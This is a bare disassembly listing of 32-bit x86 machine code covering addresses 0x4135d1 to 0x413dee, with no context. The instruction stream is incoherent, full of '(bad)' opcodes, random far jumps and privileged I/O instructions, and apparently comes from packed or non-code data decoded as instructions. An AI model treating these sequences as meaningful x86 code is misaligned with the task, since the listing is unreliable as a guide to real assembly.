  4135d1:	mov    dh,BYTE PTR [edi+0x39]
  4135d4:	ror    DWORD PTR [ebx+0x41],0x8
  4135d8:	mov    edi,0x161ada8b
  4135dd:	jecxz  0x4135ba
  4135df:	jnp    0x4135f1
  4135e1:	popf   
  4135e2:	or     DWORD PTR [ebp-0x20f6f91d],0x6744d91b
  4135ec:	addr16 (bad) 
  4135ee:	sub    BYTE PTR [ecx],ch
  4135f0:	xchg   esp,eax
  4135f1:	mov    eax,0x2f95b321
  4135f6:	inc    ecx
  4135f7:	xchg   esp,eax
  4135f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135f9:	jmp    0xcb55a126
  4135fe:	fwait
  4135ff:	cwde   
  413600:	dec    ebx
  413601:	je     0x413669
  413603:	push   eax
  413604:	rcl    ch,0x60
  413607:	arpl   WORD PTR [eax],di
  413609:	sti    
  41360a:	push   esp
  41360b:	inc    edx
  41360c:	mov    WORD PTR [ebp+0x44074519],gs
  413612:	in     eax,0xb
  413614:	mov    ebp,0x80ba263a
  413619:	test   DWORD PTR [ebp+0x5b],ecx
  41361c:	dec    esp
  41361d:	stos   DWORD PTR es:[edi],eax
  41361e:	mov    ds:0x5304530a,eax
  413623:	stos   BYTE PTR es:[edi],al
  413624:	jno    0x413627
  413626:	dec    ebx
  413627:	hlt    
  413628:	jmp    0x8c49211a
  41362d:	adc    al,0x9f
  41362f:	in     al,dx
  413630:	stos   DWORD PTR es:[edi],eax
  413631:	and    eax,0x4483712
  413636:	xor    ch,BYTE PTR [eax-0x59f8b1ed]
  41363c:	fcomi  st,st(5)
  41363e:	ins    DWORD PTR es:[edi],dx
  41363f:	sub    esp,DWORD PTR gs:[eax+0x1cc5dc01]
  413646:	cld    
  413647:	lods   eax,DWORD PTR ds:[esi]
  413648:	popa   
  413649:	and    dh,BYTE PTR ds:0x45ca447f
  41364f:	inc    ebp
  413650:	das    
  413651:	rcl    cl,1
  413653:	mov    ds:0x1834021,eax
  413658:	and    al,0xc4
  41365a:	xchg   esp,eax
  41365b:	loope  0x4136c2
  41365d:	lock mov BYTE PTR [eax-0x77059533],ah
  413664:	les    ebp,FWORD PTR [esi]
  413666:	popa   
  413667:	in     al,dx
  413668:	add    ebx,DWORD PTR [ecx*2-0x42669d96]
  41366f:	mov    WORD PTR [ebp+eiz*2+0x6c40006f],?
  413676:	xchg   edi,edx
  413678:	dec    esi
  413679:	or     bl,BYTE PTR [edi-0x56]
  41367c:	pop    ds
  41367d:	pop    edi
  41367e:	sbb    bh,bh
  413680:	push   edx
  413681:	repz sbb eax,0x11b32a4d
  413687:	lahf   
  413688:	adc    DWORD PTR [ebx+0x27],ebx
  41368b:	imul   esi,DWORD PTR [edi-0x8],0xfffffff6
  41368f:	jecxz  0x413696
  413691:	inc    ebx
  413692:	jecxz  0x41366d
  413694:	fsub   DWORD PTR [edi+eax*8+0x10]
  413698:	shl    BYTE PTR [eax-0x2e6d170d],0xbb
  41369f:	mov    esi,DWORD PTR [edx+0x3aa19d05]
  4136a5:	pop    ecx
  4136a6:	cmp    al,BYTE PTR [ebx+0x22185cb6]
  4136ac:	data16 add BYTE PTR [ebx+0x74c0afe2],dl
  4136b3:	add    ah,BYTE PTR [eax-0x36]
  4136b6:	sbb    bl,BYTE PTR [ecx+0x1f4c49dd]
  4136bc:	fst    DWORD PTR [esi-0x5a]
  4136bf:	out    dx,eax
  4136c0:	in     al,dx
  4136c1:	ficomp DWORD PTR [eax]
  4136c3:	lods   al,BYTE PTR ds:[esi]
  4136c4:	cmp    BYTE PTR [edx-0x63],dh
  4136c7:	pop    eax
  4136c8:	sbb    eax,0xa1cdb219
  4136cd:	xchg   edi,edi
  4136cf:	jl     0x4136a5
  4136d1:	and    eax,0x66f6fd09
  4136d6:	outs   dx,BYTE PTR ds:[esi]
  4136d7:	loop   0x41369b
  4136d9:	je     0x413668
  4136db:	call   0xbabb:0xdec6cbe8
  4136e2:	pop    esi
  4136e3:	sbb    edi,edi
  4136e5:	pop    ebp
  4136e6:	cmp    DWORD PTR [edi+0x6fb99ea8],0xffffffd8
  4136ed:	push   edx
  4136ee:	repnz cmp al,0xec
  4136f1:	lods   al,BYTE PTR ds:[esi]
  4136f2:	les    eax,FWORD PTR [ebx+0x2e]
  4136f5:	cmp    bh,BYTE PTR [eax-0x2e1b6d8d]
  4136fb:	(bad)
  4136ff:	lods   eax,DWORD PTR ds:[esi]
  413700:	(bad)  
  413701:	inc    esp
  413702:	fs loop 0x413721
  413705:	jmp    0x3dba6ae6
  41370a:	gs pop es
  41370c:	int3   
  41370d:	jle    0x413726
  41370f:	mov    bl,0x14
  413711:	test   al,0xc
  413713:	inc    edi
  413714:	iret   
  413715:	jmp    0x4136d1
  413717:	sti    
  413718:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413719:	mov    bh,0xe8
  41371b:	mov    eax,ds:0x52107475
  413720:	jmp    DWORD PTR [esi-0x6ff0ea76]
  413726:	mov    dl,0xae
  413728:	dec    eax
  413729:	dec    ebx
  41372a:	xchg   esi,edx
  41372c:	jp     0x4136d2
  41372e:	or     dh,BYTE PTR [ecx-0x2661f4e0]
  413734:	cmc    
  413735:	push   edi
  413736:	sbb    dh,dl
  413738:	jp     0x4136ef
  41373a:	scas   eax,DWORD PTR es:[edi]
  41373b:	and    BYTE PTR [ebx-0x7d],dh
  41373e:	jbe    0x4136ca
  413740:	sub    al,0x41
  413742:	les    ebx,FWORD PTR [edx+0x67]
  413745:	sbb    DWORD PTR [eax],0x1b
  413748:	in     eax,0xad
  41374a:	out    dx,al
  41374b:	xchg   esi,eax
  41374c:	push   0x3b
  41374e:	hlt    
  41374f:	mov    ecx,0xacdace5a
  413754:	cdq    
  413755:	pop    edi
  413756:	sbb    ecx,esi
  413758:	or     ch,BYTE PTR [ebx+0x7d48763b]
  41375e:	adc    DWORD PTR [ecx+0x42427da7],0xffffffbe
  413765:	adc    BYTE PTR [ebx+0x30],al
  413768:	xchg   ebp,eax
  413769:	sbb    eax,0xbc6476a7
  41376e:	xchg   bl,ch
  413770:	not    DWORD PTR [esi+esi*8+0x15]
  413774:	loopne 0x4137a9
  413776:	inc    esi
  413777:	sub    bl,BYTE PTR [ebx]
  413779:	sbb    DWORD PTR [edx-0x6],0xffffff95
  41377d:	es (bad) 
  413780:	test   BYTE PTR [ebx],ah
  413782:	cwde   
  413783:	dec    ebx
  413784:	loop   0x4137b1
  413786:	mov    ebx,0x400b1f2a
  41378b:	adc    al,0xdb
  41378d:	pop    edi
  41378e:	jmp    0xd1b25b72
  413793:	mov    edx,0x4364894e
  413798:	xor    ebp,DWORD PTR gs:[eax]
  41379b:	ja     0x4137c0
  41379d:	into   
  41379e:	in     al,0xa2
  4137a0:	jge    0x4137f6
  4137a2:	mov    al,0x64
  4137a4:	inc    edi
  4137a5:	retf   
  4137a6:	adc    bl,0x55
  4137a9:	popf   
  4137aa:	test   DWORD PTR [edi],esi
  4137ac:	shl    BYTE PTR [ecx+0x57420bdb],1
  4137b2:	xchg   edx,eax
  4137b3:	add    BYTE PTR [eax+edi*2],bh
  4137b6:	push   eax
  4137b7:	jl     0x413771
  4137b9:	ret    0x2bc5
  4137bc:	lock aad 0x60
  4137bf:	adc    eax,0x161e5894
  4137c4:	xchg   esp,eax
  4137c5:	push   cs
  4137c6:	adc    al,BYTE PTR [ecx+edx*2]
  4137c9:	mov    dh,0x1c
  4137cb:	jg     0x413836
  4137cd:	and    BYTE PTR [ecx+0x34ad30bd],bh
  4137d3:	ins    BYTE PTR es:[edi],dx
  4137d4:	inc    ebx
  4137d5:	out    dx,eax
  4137d6:	cmp    eax,DWORD PTR [ebx+0x675d785c]
  4137dc:	mov    ch,0x5b
  4137de:	retf   
  4137df:	repz or bl,BYTE PTR [edi]
  4137e2:	(bad)  
  4137e3:	aam    0x1f
  4137e5:	dec    esi
  4137e6:	and    al,0xb7
  4137e8:	or     ebp,0xb967deb6
  4137ee:	push   0x4677d67d
  4137f3:	mov    eax,ds:0xc4f49191
  4137f8:	lds    esi,FWORD PTR [esi+0xa]
  4137fb:	lea    ecx,[ebx]
  4137fd:	ss push eax
  4137ff:	pop    esp
  413800:	int    0x8b
  413802:	add    eax,0xeac4e0bc
  413807:	mov    ds:0x802ac1b,eax
  41380c:	inc    edi
  41380d:	and    al,0xbd
  41380f:	add    ch,bl
  413811:	mov    edi,0x4a6e849b
  413816:	outs   dx,BYTE PTR ds:[esi]
  413817:	adc    BYTE PTR [edi-0x72],dh
  41381a:	mov    bl,0xed
  41381c:	push   esp
  41381d:	aaa    
  41381e:	scas   eax,DWORD PTR es:[edi]
  41381f:	sbb    eax,0x7948bc04
  413824:	push   ebp
  413825:	xchg   ebx,eax
  413826:	stos   DWORD PTR es:[edi],eax
  413827:	push   esi
  413828:	addr16 aaa 
  41382a:	stc    
  41382b:	dec    esi
  41382c:	dec    edi
  41382d:	sar    dh,1
  41382f:	int    0x4d
  413831:	loope  0x413809
  413833:	push   ss
  413834:	sbb    cl,dl
  413836:	(bad)  
  413837:	int    0x7e
  413839:	add    eax,0xa1c1d6b
  41383e:	hlt    
  41383f:	mov    eax,ds:0x54db9947
  413844:	(bad)  
  413845:	test   al,0xeb
  413847:	adc    ah,dh
  413849:	aas    
  41384a:	dec    ebp
  41384b:	xor    eax,edx
  41384d:	add    DWORD PTR [ebx-0x41],esp
  413850:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413851:	shl    DWORD PTR [ecx+esi*4+0x68],1
  413855:	in     eax,0x9d
  413857:	jbe    0x413815
  413859:	leave  
  41385a:	cmp    ch,ah
  41385c:	test   eax,0x4a4ec045
  413861:	popa   
  413862:	mov    bh,0x63
  413864:	dec    eax
  413865:	jno    0x4138c3
  413867:	out    0x1b,eax
  413869:	test   DWORD PTR [esp+edx*4-0x741b7d8e],ebx
  413870:	mov    bl,0x15
  413872:	adc    ebx,edi
  413874:	test   BYTE PTR ds:0x79563717,ch
  41387a:	sbb    al,0x9d
  41387c:	xchg   edx,eax
  41387d:	jecxz  0x413880
  41387f:	inc    edx
  413880:	jnp    0x413869
  413882:	aad    0x48
  413884:	pop    edx
  413885:	inc    edi
  413886:	jmp    0xb4c5:0xf638337
  41388d:	add    eax,0x213b4ab0
  413892:	add    DWORD PTR [ebp-0x2f4a1ec1],esp
  413898:	jae    0x413842
  41389a:	aas    
  41389b:	push   edi
  41389c:	adc    al,BYTE PTR [edx-0x54]
  41389f:	retf   0x9746
  4138a2:	mov    ah,0x4a
  4138a4:	adc    eax,0x6d68f499
  4138a9:	call   0x4027:0x1b458d7d
  4138b0:	mov    ebp,DWORD PTR [esi+0x1f]
  4138b3:	shl    DWORD PTR [eax+0x37],cl
  4138b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138b7:	and    esi,DWORD PTR [edx]
  4138b9:	mov    edi,0xa74fc698
  4138be:	lods   eax,DWORD PTR ds:[esi]
  4138bf:	cmp    eax,DWORD PTR [edi]
  4138c1:	add    dh,ah
  4138c3:	jns    0x4138dd
  4138c5:	loope  0x413921
  4138c7:	xchg   edx,eax
  4138c8:	mov    ch,0x19
  4138ca:	push   esi
  4138cb:	leave  
  4138cc:	push   cs
  4138cd:	pushf  
  4138ce:	xor    eax,0x29a2da29
  4138d3:	mov    edi,0x869d23d0
  4138d8:	or     eax,0x4ff6ce23
  4138dd:	call   0xc33b11f1
  4138e2:	inc    bp
  4138e4:	fstp   DWORD PTR [eax]
  4138e6:	pop    esp
  4138e7:	fild   QWORD PTR fs:[edi+eax*2-0x6]
  4138ec:	loope  0x413887
  4138ee:	bound  edi,QWORD PTR [edi-0x2a98bf3f]
  4138f4:	leave  
  4138f5:	loopne 0x413912
  4138f7:	les    ecx,FWORD PTR [eax]
  4138f9:	(bad)  
  4138fa:	push   ebp
  4138fb:	ror    DWORD PTR [edx-0x57],1
  4138fe:	test   BYTE PTR [ecx+0x12],0x33
  413902:	inc    esp
  413903:	jb     0x4138c9
  413905:	jmp    0x413891
  413907:	pop    edx
  413908:	mov    ds:0xc1ac9f38,al
  41390d:	bound  edi,QWORD PTR [ecx-0x32]
  413910:	call   0xcfc1:0x7c0cf1d2
  413917:	mov    ebx,0xa35f2481
  41391c:	rcl    DWORD PTR [edi],0x71
  41391f:	dec    edx
  413920:	call   0x1a1ba8d5
  413925:	pop    esp
  413926:	mov    al,0x3c
  413928:	push   ebx
  413929:	mov    esi,0x36c63fc0
  41392e:	cs and esi,edx
  413931:	jne    0x4138df
  413933:	mov    ds:0x4bfe25c9,eax
  413938:	shr    eax,0x6e
  41393b:	in     eax,dx
  41393c:	imul   edi,DWORD PTR [edx+0x2af82856],0xffffffad
  413943:	add    DWORD PTR [edi],ebp
  413945:	and    BYTE PTR [eax-0x72],bh
  413948:	push   0x2c
  41394a:	mov    bh,BYTE PTR [edi-0x10cc33cd]
  413950:	repz daa 
  413952:	cmp    BYTE PTR [ebp-0x35ae3a0c],ah
  413958:	(bad)  
  413959:	jb     0x41391f
  41395b:	sub    BYTE PTR ds:0xe1d22ce4,dh
  413961:	fdivr  QWORD PTR ds:0x94160043
  413967:	ret    0x7348
  41396a:	hlt    
  41396b:	inc    eax
  41396c:	pavgw  mm5,QWORD PTR ds:0x1d0a54f7
  413973:	aas    
  413974:	outs   dx,DWORD PTR ds:[esi]
  413975:	leave  
  413976:	nop
  413977:	in     al,0x12
  413979:	push   ss
  41397a:	and    dl,cl
  41397c:	sub    DWORD PTR [ecx],ebx
  41397e:	inc    esp
  41397f:	add    DWORD PTR [ecx],edx
  413981:	dec    ecx
  413982:	sahf   
  413983:	jo     0x41390c
  413985:	mov    eax,ds:0xcc049d0f
  41398a:	or     al,0x7f
  41398c:	inc    eax
  41398d:	pop    es
  41398e:	jae    0x413971
  413990:	rol    DWORD PTR [edx+edx*4+0x7798100],cl
  413997:	mov    ebx,0x6105133a
  41399c:	repz mov al,ds:0xd1c9db8
  4139a2:	mov    dh,dh
  4139a4:	xor    esi,DWORD PTR [ebx+0x5a]
  4139a7:	imul   ebp,DWORD PTR [edx+0x9],0xb32eeacc
  4139ae:	mov    DWORD PTR [ecx+0x17],edi
  4139b1:	cdq    
  4139b2:	cmp    BYTE PTR [edx],0x18
  4139b5:	fwait
  4139b6:	jns    0x413951
  4139b8:	fadd   DWORD PTR [edx-0x5785d63]
  4139be:	inc    edi
  4139bf:	scas   eax,DWORD PTR es:[edi]
  4139c0:	fstp   DWORD PTR [ebx-0x33663fa7]
  4139c6:	and    ebp,0x2b
  4139c9:	cmp    BYTE PTR ds:0xc2e1a177,cl
  4139cf:	push   0x5ae52f10
  4139d4:	ror    DWORD PTR [edi+eiz*1-0x74],0x43
  4139d9:	xchg   edi,eax
  4139da:	out    dx,al
  4139db:	jno    0x413961
  4139dd:	and    esi,DWORD PTR [eax+0x2bdae923]
  4139e3:	jmp    0xc9c50f
  4139e8:	fist   WORD PTR [edx+0xb]
  4139eb:	mov    al,0xbe
  4139ed:	outs   dx,BYTE PTR ds:[esi]
  4139ee:	mov    eax,0xb0d93556
  4139f3:	pushf  
  4139f4:	jecxz  0x4139ff
  4139f6:	cmp    bh,dl
  4139f8:	add    DWORD PTR [edx],ebx
  4139fa:	mov    ebp,0x6e855406
  4139ff:	xchg   BYTE PTR [ecx+edi*4-0x21],al
  413a03:	and    BYTE PTR [ecx],bh
  413a05:	push   ds
  413a06:	iret   
  413a07:	es and eax,0x74e34c93
  413a0d:	in     al,dx
  413a0e:	xchg   ebp,eax
  413a0f:	inc    ebx
  413a10:	cs sbb ebx,ebp
  413a13:	adc    dh,BYTE PTR [eax+0xb]
  413a16:	inc    edi
  413a17:	outs   dx,DWORD PTR ds:[esi]
  413a18:	jnp    0x413a6f
  413a1a:	xchg   edx,eax
  413a1b:	dec    eax
  413a1c:	aaa    
  413a1d:	imul   esi,ecx,0x52
  413a20:	lds    esi,FWORD PTR [eax-0x61355f2e]
  413a26:	and    cl,BYTE PTR ds:0x2f631733
  413a2c:	and    ch,ah
  413a2e:	push   ecx
  413a2f:	sbb    BYTE PTR [edi],ch
  413a31:	retf   0x629d
  413a34:	push   ss
  413a35:	fisub  DWORD PTR [ecx+0x3c31b0b5]
  413a3b:	mov    DWORD PTR [esi-0x56],esp
  413a3e:	jecxz  0x413a57
  413a40:	sub    eax,DWORD PTR [ebx-0x3911e8aa]
  413a46:	or     eax,0x3b55e584
  413a4b:	adc    dl,dl
  413a4d:	inc    esp
  413a4e:	enter  0xcdf0,0x2d
  413a52:	mov    ds:0x2fdada80,eax
  413a57:	ss fs cld 
  413a5a:	and    esp,edx
  413a5c:	mov    ds:0x13b72fa2,eax
  413a61:	mov    bh,0x9f
  413a63:	xchg   ebx,eax
  413a64:	adc    al,0x1f
  413a66:	inc    edi
  413a67:	xor    BYTE PTR [edx+esi*2+0x72],al
  413a6b:	cld    
  413a6c:	and    eax,eax
  413a6e:	js     0x413a1a
  413a70:	cli    
  413a71:	icebp  
  413a72:	jmp    0x1af5:0xa90132be
  413a79:	mov    esp,0xffd2ee4
  413a7e:	add    eax,0xd62b8f0d
  413a83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a84:	leave  
  413a85:	mov    BYTE PTR [ebp-0x2dd131af],0x9e
  413a8c:	or     dl,BYTE PTR [ecx-0x2bcfdc05]
  413a92:	pop    edi
  413a93:	fld    QWORD PTR [ebx-0x63]
  413a96:	out    dx,eax
  413a97:	neg    BYTE PTR [edx-0x64]
  413a9a:	xchg   esi,eax
  413a9b:	bndstx [ebp+ebx*4+0x2fe8eb39],(bad)
  413aa3:	xor    al,BYTE PTR [eax+0x28]
  413aa6:	push   edx
  413aa7:	push   0x7e44ac68
  413aac:	shr    DWORD PTR ds:0x797b8c3c,cl
  413ab2:	test   BYTE PTR [ebp-0x722ae315],dh
  413ab8:	xor    ecx,DWORD PTR [ebx-0x1b]
  413abb:	adc    ah,BYTE PTR [esi-0x28e5b543]
  413ac1:	ror    BYTE PTR [eax-0x1e],1
  413ac4:	adc    BYTE PTR [edi-0x956c637],cl
  413aca:	fcomip st,st(0)
  413acc:	push   ss
  413acd:	add    ecx,ebp
  413acf:	dec    edi
  413ad0:	aaa    
  413ad1:	dec    esp
  413ad2:	jns    0x413af7
  413ad4:	add    esi,0xfffffff6
  413ad7:	ss repz mov esp,0x9c2dcd3
  413ade:	jnp    0x413b08
  413ae0:	fst    QWORD PTR [ebp-0x57]
  413ae3:	and    al,0x51
  413ae5:	cld    
  413ae6:	popa   
  413ae7:	pusha  
  413ae8:	fsub   QWORD PTR [eax+0x7d]
  413aeb:	retf   
  413aec:	push   edi
  413aed:	adc    eax,0x73700c11
  413af2:	push   0x2d
  413af4:	fsub   st,st(4)
  413af6:	push   ecx
  413af7:	loopne 0x413b2c
  413af9:	int    0xe0
  413afb:	daa    
  413afc:	stos   DWORD PTR es:[edi],eax
  413afd:	mov    dl,0x4c
  413aff:	and    al,0x98
  413b01:	lods   al,BYTE PTR ds:[esi]
  413b02:	mov    BYTE PTR [ebx],dl
  413b04:	mov    dl,0x7b
  413b06:	aad    0x8a
  413b08:	sbb    cl,BYTE PTR [edx+0xc]
  413b0b:	or     BYTE PTR [edx+0x6b201363],al
  413b11:	cmp    DWORD PTR [edi],ecx
  413b13:	enter  0xff4e,0x17
  413b17:	les    esi,FWORD PTR [esi+0x54b96597]
  413b1d:	cmp    eax,0xe2587600
  413b22:	hlt    
  413b23:	adc    ebp,DWORD PTR [ebx-0x27]
  413b26:	pop    ebx
  413b27:	sbb    eax,ecx
  413b29:	fsubr  DWORD PTR [esi+esi*4-0x74]
  413b2d:	(bad)  
  413b2f:	sbb    BYTE PTR [edx+0x7],0xc7
  413b33:	je     0x413b7c
  413b35:	xlat   BYTE PTR ds:[ebx]
  413b36:	sbb    eax,0xc118b75
  413b3b:	xchg   DWORD PTR [ebx+ebp*4-0x7e],esi
  413b3f:	pop    edx
  413b40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b41:	mov    WORD PTR [ebp-0x6e5464a3],es
  413b47:	in     eax,0xa1
  413b49:	dec    ebx
  413b4a:	popf   
  413b4b:	inc    eax
  413b4c:	cld    
  413b4d:	and    esp,esp
  413b4f:	cmp    edx,ebx
  413b51:	jg     0x413ae1
  413b53:	clc    
  413b54:	test   eax,0xa8bab2ee
  413b59:	mov    eax,ss:0x51ec7257
  413b5f:	push   edi
  413b60:	and    edx,DWORD PTR [eax+0x6d]
  413b63:	dec    ebx
  413b64:	mov    eax,0xcc50b921
  413b69:	(bad)  
  413b6a:	pop    ecx
  413b6b:	dec    eax
  413b6c:	inc    edx
  413b6d:	int3   
  413b6e:	(bad)  
  413b6f:	cwde   
  413b70:	int3   
  413b71:	imul   esp,DWORD PTR [ebx+edi*1+0x54],0x2bbfaaee
  413b79:	and    bl,bl
  413b7b:	lea    ecx,[ecx+0x4b989c4c]
  413b81:	and    ecx,DWORD PTR [esi-0x5e]
  413b84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b85:	push   es
  413b86:	add    al,0x8b
  413b88:	inc    ebx
  413b89:	out    dx,al
  413b8a:	mov    bh,BYTE PTR [ebp+0x6f]
  413b8d:	aas    
  413b8e:	js     0x413b13
  413b90:	lods   eax,DWORD PTR ds:[esi]
  413b91:	test   DWORD PTR [esi-0xd2f00c6],0x10a4a421
  413b9b:	lods   eax,DWORD PTR ds:[esi]
  413b9c:	sbb    al,0x21
  413b9e:	mov    ah,0xdd
  413ba0:	in     eax,dx
  413ba1:	arpl   WORD PTR cs:[esi+0x671a13d],dx
  413ba8:	fwait
  413ba9:	push   ds
  413baa:	icebp  
  413bab:	dec    edi
  413bac:	pop    edx
  413bad:	cdq    
  413bae:	call   0xddf450de
  413bb3:	sub    dh,bl
  413bb5:	xor    ebp,DWORD PTR ds:0x837a0814
  413bbb:	outs   dx,DWORD PTR ds:[esi]
  413bbc:	sbb    edx,DWORD PTR [ecx]
  413bbe:	mov    bh,BYTE PTR [ebp+0x6a7d2a5]
  413bc4:	lock pop ds
  413bc6:	fwait
  413bc7:	cwde   
  413bc8:	aam    0xcc
  413bca:	or     BYTE PTR [eax+ebp*8+0x52],0xed
  413bcf:	jmp    0xa315a9af
  413bd4:	popf   
  413bd5:	retf   
  413bd6:	iret   
  413bd7:	mov    bl,0xb8
  413bd9:	mov    BYTE PTR [eax],dh
  413bdb:	out    0xc2,eax
  413bdd:	mov    edi,0xff1fe8e0
  413be2:	pushf  
  413be3:	mov    ecx,0x1088b7bd
  413be8:	hlt    
  413be9:	mov    eax,ds:0xa85bc057
  413bee:	sub    DWORD PTR [eax-0x282390c4],eax
  413bf4:	fidiv  WORD PTR [ebx]
  413bf6:	js     0x413bef
  413bf8:	adc    eax,0xfbc0c25
  413bfd:	cld    
  413bfe:	aaa    
  413bff:	sbb    al,0xc9
  413c01:	sti    
  413c02:	mov    edi,0x6bc51428
  413c07:	xor    eax,0xb0a4cd5
  413c0c:	or     bl,dh
  413c0e:	test   DWORD PTR [edx],ebx
  413c10:	pop    edx
  413c11:	mov    ecx,0xf128a331
  413c16:	add    ecx,esp
  413c18:	and    esi,edi
  413c1a:	mov    ch,BYTE PTR ds:0xabe20d97
  413c20:	fsub   QWORD PTR [edi+edi*8+0x76]
  413c24:	dec    ebp
  413c25:	stc    
  413c26:	cmc    
  413c27:	repnz and eax,0x67142ea2
  413c2d:	jb     0x413c83
  413c2f:	xor    BYTE PTR [ebx-0x1d],ah
  413c32:	and    ah,BYTE PTR [edi-0x21c0792c]
  413c38:	mov    edx,0x53e562c1
  413c3d:	wbinvd 
  413c3f:	leave  
  413c40:	mov    edx,0x56f6dc92
  413c45:	xor    DWORD PTR ds:0x36254d42,eax
  413c4b:	gs fs inc eax
  413c4e:	sbb    eax,0x1b71f7a8
  413c53:	sbb    bh,cl
  413c55:	repz xchg esi,eax
  413c58:	call   0x3c34d5fc
  413c5d:	jl     0x413c83
  413c5f:	iret   
  413c60:	ja     0x413c93
  413c62:	jmp    0xb3d:0xf500c713
  413c69:	ds out 0x1d,eax
  413c6c:	dec    esi
  413c6d:	ret    0x729c
  413c70:	jmp    0xf52f1b75
  413c75:	adc    al,0xea
  413c77:	sar    DWORD PTR [eax],cl
  413c79:	jbe    0x413cde
  413c7b:	mov    dl,0xaf
  413c7d:	es mov edi,0xc592c84d
  413c83:	mov    ebx,0x9a724b9d
  413c88:	push   edx
  413c89:	push   ecx
  413c8a:	pop    edi
  413c8b:	lods   al,BYTE PTR ds:[esi]
  413c8c:	and    ah,BYTE PTR [ebx]
  413c8e:	pop    eax
  413c8f:	ds leave 
  413c91:	jp     0x413ce7
  413c93:	fisub  DWORD PTR [eax-0x50]
  413c96:	mov    BYTE PTR [edi+0x6edcd3af],bh
  413c9c:	jl     0x413cb7
  413c9e:	retf   0xba01
  413ca1:	gs cmp bl,bh
  413ca4:	jne    0x413c5a
  413ca6:	test   eax,0x439eccc5
  413cab:	out    0x77,eax
  413cad:	push   ebx
  413cae:	pop    edx
  413caf:	jg     0x413c8d
  413cb1:	dec    edi
  413cb2:	arpl   WORD PTR [eax-0x1fe42c19],bp
  413cb8:	and    al,0x87
  413cba:	add    cl,ah
  413cbc:	sub    eax,0xdc944c3c
  413cc1:	push   eax
  413cc2:	cli    
  413cc3:	inc    edi
  413cc4:	dec    ecx
  413cc5:	fsincos 
  413cc7:	add    BYTE PTR [ecx-0x2c],bl
  413cca:	inc    ecx
  413ccb:	outs   dx,DWORD PTR ds:[esi]
  413ccc:	retf   
  413ccd:	in     eax,0x8f
  413ccf:	push   edi
  413cd0:	dec    esi
  413cd1:	inc    ebx
  413cd2:	xchg   esp,eax
  413cd3:	cld    
  413cd4:	icebp  
  413cd5:	push   ebx
  413cd6:	ret    0xcdb1
  413cd9:	les    esi,FWORD PTR [esi+0x51]
  413cdc:	int    0x7
  413cde:	shr    DWORD PTR [ebx],0x9c
  413ce1:	test   BYTE PTR [esi-0x6f],0x54
  413ce5:	add    esi,edi
  413ce7:	int3   
  413ce8:	lock pop edx
  413cea:	mov    ah,0xc5
  413cec:	inc    esi
  413ced:	dec    ebx
  413cee:	mov    ecx,0x9642e20b
  413cf3:	std    
  413cf4:	mov    al,0x9a
  413cf6:	lea    edx,[edx+0x70ad313f]
  413cfc:	ss inc ecx
  413cfe:	fidivr WORD PTR [ebx-0xc]
  413d01:	cmp    edx,DWORD PTR [edx+0x7b5dc131]
  413d07:	push   ebx
  413d08:	pop    ecx
  413d09:	repz aas 
  413d0b:	cmp    DWORD PTR [eax-0x485347a7],edi
  413d11:	xchg   esi,eax
  413d12:	xchg   ebx,eax
  413d13:	xor    ah,ch
  413d15:	mov    ds:0x1e79f8c2,eax
  413d1a:	pop    eax
  413d1b:	push   esi
  413d1c:	pop    ebp
  413d1d:	rdpmc  
  413d1f:	or     esi,esp
  413d21:	je     0x413ce2
  413d23:	(bad)  
  413d24:	in     eax,0xe3
  413d26:	ret    0x435e
  413d29:	test   al,0xb
  413d2b:	into   
  413d2c:	cs push edx
  413d2e:	test   eax,0x9f8c6f7a
  413d33:	or     eax,0x29d1bd33
  413d39:	xchg   DWORD PTR [ecx-0x4b3d5ca3],ebp
  413d3f:	sub    eax,0x3a405a40
  413d44:	mov    ah,0xe1
  413d46:	(bad)  
  413d47:	ficomp DWORD PTR [edx+esi*2+0x616585c4]
  413d4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d4f:	shl    DWORD PTR [esi],1
  413d51:	and    BYTE PTR [edi+eax*1+0x3029868d],0x2d
  413d59:	lods   eax,DWORD PTR ds:[esi]
  413d5a:	dec    edx
  413d5b:	inc    esp
  413d5c:	or     eax,DWORD PTR [edi]
  413d5e:	sahf   
  413d5f:	jne    0x413d3d
  413d61:	hlt    
  413d62:	push   ss
  413d63:	inc    edi
  413d64:	repz push cs
  413d66:	or     al,0x5a
  413d68:	fwait
  413d69:	mov    ah,0x90
  413d6b:	mov    DWORD PTR [bp-0x675d],esp
  413d70:	outs   dx,DWORD PTR ds:[esi]
  413d71:	and    eax,0x88fc4a89
  413d76:	je     0x413d55
  413d78:	cs addr16 and ah,ah
  413d7c:	inc    esp
  413d7d:	out    dx,eax
  413d7e:	and    eax,0x16d20312
  413d83:	and    cl,bl
  413d85:	pop    ecx
  413d86:	std    
  413d87:	xchg   esi,eax
  413d88:	sbb    DWORD PTR [edi+0x61],esi
  413d8b:	mov    esi,0x1439b5c3
  413d90:	jmp    0xa2c1b978
  413d95:	add    al,0xec
  413d97:	jo     0x413d5f
  413d99:	mov    WORD PTR [ecx-0x79],?
  413d9c:	pusha  
  413d9d:	test   esi,esi
  413d9f:	cmp    ebp,DWORD PTR [edi]
  413da1:	ret    0x7632
  413da4:	mov    eax,0x8d29fa0d
  413da9:	add    al,0x67
  413dab:	dec    edi
  413dac:	add    esi,DWORD PTR [ebx+eiz*4+0x52]
  413db0:	dec    ebx
  413db1:	enter  0x1b61,0xa7
  413db5:	mov    edx,0x25d3fb56
  413dba:	loope  0x413ddf
  413dbc:	ret    0x4243
  413dbf:	push   ds
  413dc0:	hlt    
  413dc1:	mov    BYTE PTR [ebp-0x66067a04],dh
  413dc7:	lods   eax,DWORD PTR ds:[esi]
  413dc8:	test   eax,0xf0e6dad4
  413dcd:	pop    ecx
  413dce:	dec    eax
  413dcf:	cmp    cl,dh
  413dd1:	xor    eax,0xe840e251
  413dd6:	or     eax,0x77c4c85
  413ddb:	mov    ecx,esi
  413ddd:	mov    al,ds:0xf7a0d1cc
  413de2:	and    edx,DWORD PTR [esi-0x767060de]
  413de8:	xor    DWORD PTR [edx+ebx*1-0x72],0xffffff9f
  413ded:	fwait
  413dee:	mov    ds:0xc2235f96,eax
